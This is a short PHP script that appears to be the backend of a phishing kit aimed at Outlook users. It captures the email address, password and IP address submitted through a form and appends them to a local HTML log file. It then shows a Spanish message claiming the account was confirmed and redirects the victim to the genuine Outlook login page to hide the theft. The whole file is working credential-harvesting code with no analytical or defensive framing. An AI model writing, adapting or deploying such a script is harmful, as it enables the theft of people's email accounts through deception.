<?php

$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("culo.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
fclose($f);

$mensaje = "Su cuenta de correo ha sido confirmada exitosamente";
echo "<script>";
echo "alert('$mensaje');";  
echo "window.location = 'https://outlook.live.com/owa/';";
echo "</script>";  